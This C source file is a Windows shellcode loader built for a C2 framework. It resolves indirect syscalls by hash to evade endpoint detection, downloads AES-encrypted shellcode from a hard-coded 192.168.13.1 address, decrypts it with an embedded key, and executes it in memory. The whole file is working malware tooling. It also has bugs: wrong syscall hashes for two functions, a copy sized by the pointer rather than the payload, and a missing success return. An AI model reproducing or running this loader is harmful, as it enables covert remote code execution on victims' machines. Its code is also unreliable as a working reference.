#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <wininet.h>
#include "aes.h"
#include <winternl.h>
#include "HellsHall.h"

#define NtAllocateVirtualMemory_CRC32    0x498165AA
#define NtProtectVirtualMemory_CRC32     0x17C9087B
#define NtWriteVirtualMemory_CRC32       0xF7C5A233
#define NtCreateThreadEx_CRC32			 0x6411D915
#define NtWaitForSingleObject_CRC32      0x3D93EDA4
#define NtSuspendThread_CRC32		0xD7288A6E
#define NtGetContextThread_CRC32    0xC402D0FC
#define NtSetContextThread_CRC32    0xF614A2E5
#define NtResumeThread_CRC32		0xD67413A8

// import wininet.lib

#pragma comment (lib, "Wininet.lib")
#define PAYLOAD L"http://192.168.13.1:8000/encrypted_shellcode_adaptix.bin"
#define TARGET_PROCESS "Notepad.exe"
// basic shellcode loader that have the shellcode embedded within the file

// set to 1 for error logs

#define DEBUG

typedef struct _NTAPI_FUNC
{
	NT_SYSCALL	NtAllocateVirtualMemory;
	NT_SYSCALL	NtProtectVirtualMemory;
	NT_SYSCALL	NtWriteVirtualMemory;
	NT_SYSCALL	NtWaitForSingleObject;
    NT_SYSCALL  NtCreateThreadEx;

}NTAPI_FUNC, * PNTAPI_FUNC;

NTAPI_FUNC S = { 0 };

// defining the API that we want to import using custom GetModuleHandle and GetProcAddress on runtime

BOOL InitializeNtSyscalls() {

	if (!FetchNtSyscall(NtAllocateVirtualMemory_CRC32, &S.NtAllocateVirtualMemory)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtAllocateVirtualMemory \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtProtectVirtualMemory_CRC32, &S.NtProtectVirtualMemory)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtProtectVirtualMemory \n");
		return FALSE;
	}

	if (!FetchNtSyscall(NtWaitForSingleObject_CRC32, &S.NtWaitForSingleObject)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtWaitForSingleObject \n");
		return FALSE;
	}
	if (!FetchNtSyscall(NtSuspendThread_CRC32, &S.NtCreateThreadEx)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtCreateThreadEx\n");
		return FALSE;
	}
	if (!FetchNtSyscall(NtSuspendThread_CRC32, &S.NtWriteVirtualMemory)) {
		printf("[!] Failed In Obtaining The Syscall Number Of NtWriteVirtualMemory\n");
		return FALSE;
	}

}

typedef BOOL (WINAPI* fnCreateProcessA)(
    IN LPCSTR lpApplicationName,
    IN LPSTR lpCommandLine,
    IN LPSECURITY_ATTRIBUTES lpProcessAttributes,
    IN LPSECURITY_ATTRIBUTES lpThreadAttributes,
    IN BOOL bInheritHandles,
    IN DWORD dwCreationFlags,
    IN LPVOID lpEnvironment,
    IN LPCSTR lpCurrentDirectory,
    IN LPSTARTUPINFOA lpStartupInfo,
    OUT LPPROCESS_INFORMATION lpProcessInformation
);


DWORD HashStringDjb2A(_In_ LPCSTR String)
{
	ULONG Hash = 5381;
	INT c = 0;

	while (c = *String++)
		Hash = ((Hash << 5) + Hash) + c;

	return Hash;
}


BOOL GetPayload(LPCWSTR srcurl, PBYTE* sPayloadBytes, size_t* sPayloadSize) {

    PBYTE pTmpBytes = NULL;

    PBYTE pBytes = NULL;

    SSIZE_T sSize = 0;

    DWORD dwBytesRead = 0;

    HINTERNET hInternet = NULL;

    HINTERNET hInternetFile = NULL;
    // open an hInternet Handle
    hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);

    hInternetFile = InternetOpenUrlW(hInternet, srcurl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);

    if (hInternetFile == NULL) {
        #ifdef DEBUG
        printf("[!] InternetOpenUrlW failed with code: %d \n", GetLastError());
        #endif
        return FALSE;
    }

    // Allocate a temp 1024 bytes memory region
    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);

    while (TRUE)
    {

        // InternetReadFile will report less read bytes if the final chunk is less than 1024 bytes
        if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
            #ifdef DEBUG
            printf("[!] InternetReadFile failed with error: %d \s", GetLastError());
            #endif
            return FALSE;
        }

        // update the amount of readable bytes to the total size
        sSize += dwBytesRead;

        if (pBytes == NULL) { // if pBytes haven't been allocated yet.
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        } else { // Relloc every time sSize updates
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
        }

        if (pBytes == NULL) {
            return FALSE;
        }

        // Add the temp buffer to the end of the total buffer
        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

        memset(pTmpBytes, '\0', dwBytesRead);

        if (dwBytesRead < 1024) {
            break;
        }

    }

        InternetCloseHandle(hInternet);
        InternetCloseHandle(hInternetFile);
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);

        *sPayloadBytes = pBytes;
        *sPayloadSize = sSize;

        LocalFree(pTmpBytes);
        #ifdef DEBUG
        printf("[+] Size of payload: %d \n", sSize);
        #endif
        return TRUE;

}


unsigned char AesKey[] = {
	0xAC, 0x85, 0x0C, 0xAD, 0xDB, 0x0F, 0x69, 0xED, 0x58, 0x21, 0xD8, 0xEE, 0xA7, 0x7E, 0x24, 0x24,
	0xFB, 0xDD, 0x34, 0xA4, 0xA9, 0x90, 0x28, 0xE3, 0xDB, 0x65, 0xA5, 0xC1, 0x89, 0xCA, 0x6C, 0xC6 };


unsigned char AesIv[] = {
	0x0D, 0x01, 0x7F, 0x63, 0x51, 0xA6, 0x7A, 0xFB, 0x2C, 0x69, 0x73, 0x83, 0x7E, 0xF9, 0x75, 0xA6 };

// for debugging only

VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {

	printf("unsigned char %s[] = {", Name);

	for (int i = 0; i < Size; i++) {
		if (i % 16 == 0) {
			printf("\n\t");
		}
		if (i < Size - 1) {
			printf("0x%0.2X, ", Data[i]);
		}
		else {
			printf("0x%0.2X ", Data[i]);
		}
	}

	printf("};\n\n\n");

}
BOOL DecryptAES(IN PBYTE pCipherTextBuffer, IN SIZE_T sCipherTextSize, IN PBYTE pAesKey, IN PBYTE pAesIv) {

	struct	AES_ctx AesCtx = { 0x00 };

	if (!pCipherTextBuffer || !sCipherTextSize || !pAesKey || !pAesIv)
		return FALSE;

	RtlSecureZeroMemory(&AesCtx, sizeof(AesCtx));
	AES_init_ctx_iv(&AesCtx, pAesKey, pAesIv);
	AES_CBC_decrypt_buffer(&AesCtx, pCipherTextBuffer, sCipherTextSize);

	return TRUE;
}

int main(int argc, char* argv[]) {
    PBYTE pEncrypted = NULL;
    size_t sSizeOfPayload = 0;
    DWORD flOldProtect = 0;
    DWORD dwProcessId = 0;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    PVOID pShellcodeAddress = NULL;
    NTSTATUS STATUS = 0x00;

    if (!InitializeNtSyscalls()) {
        return -1;
    }

    // 1: Get encrypted payload

    if (!GetPayload(PAYLOAD, &pEncrypted, &sSizeOfPayload)) {
        #ifdef DEBUG
        printf("[!] Failed to get the payload\n ");
        #endif
        return -1;
    }

    // 2: Decrypt Payload

    #ifdef DEBUG
    PrintHexData("pEncrypted", pEncrypted, sSizeOfPayload);
    PrintHexData("AESKey", AesKey, sizeof(AesKey));
    printf("[+] Press Enter to continue......");
    getchar();
    #endif

    if (!DecryptAES(pEncrypted, sSizeOfPayload, AesKey, AesIv)) {
        #ifdef DEBUG
        printf("[!] Failed to decrypt the buffer \n ");
        #endif
        return -1;
    }

    #ifdef DEBUG
    PrintHexData("pDecrypted", pEncrypted, sSizeOfPayload);
    printf("[+] Press Enter to continue......");
    getchar();
    #endif


    SET_SYSCALL(S.NtAllocateVirtualMemory);
    if ((STATUS = RunSyscall((HANDLE)-1, &pShellcodeAddress, 0, &sSizeOfPayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x0) {
        printf("[!] NtAllocateVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
        return -1;
    }

    printf("[+] pAddress : 0x%p \n", pShellcodeAddress);


    memcpy(pShellcodeAddress, pEncrypted, sizeof(pEncrypted));


    SET_SYSCALL(S.NtProtectVirtualMemory);
    if ((STATUS = RunSyscall((HANDLE)-1, &pShellcodeAddress, &sSizeOfPayload, PAGE_EXECUTE_READ, &flOldProtect)) != 0x0) {
        printf("[!] NtProtectVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
        return -1;
    }

    SET_SYSCALL(S.NtCreateThreadEx);

    if ((STATUS = RunSyscall(&hThread, 0x1FFFFF, NULL, (HANDLE)-1, pShellcodeAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x0) {
		printf("[!] NtCreateThreadEx Failed With Status : 0x%0.8X\n", STATUS);
		return -1;
	}

    return 0;
}
